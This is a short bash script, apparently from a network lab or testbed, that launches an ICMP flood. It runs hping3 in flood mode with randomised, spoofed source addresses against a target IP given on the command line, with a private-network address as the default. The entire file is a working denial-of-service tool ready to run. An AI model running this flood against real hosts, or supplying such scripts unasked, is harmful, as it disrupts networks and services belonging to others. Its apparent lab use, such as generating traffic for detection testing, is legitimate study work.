#!/bin/bash
# ICMP Flood Attack Script
# Uses hping3 to generate ICMP flood traffic
#
# Usage: sudo bash attack/icmp_flood.sh <target_ip>

TARGET_IP=${1:-"10.0.2.1"}

echo "=== ICMP Flood Attack ==="
echo "Target: $TARGET_IP"
echo "Press Ctrl+C to stop"
echo "========================="

sudo hping3 --icmp --flood -V --rand-source $TARGET_IP
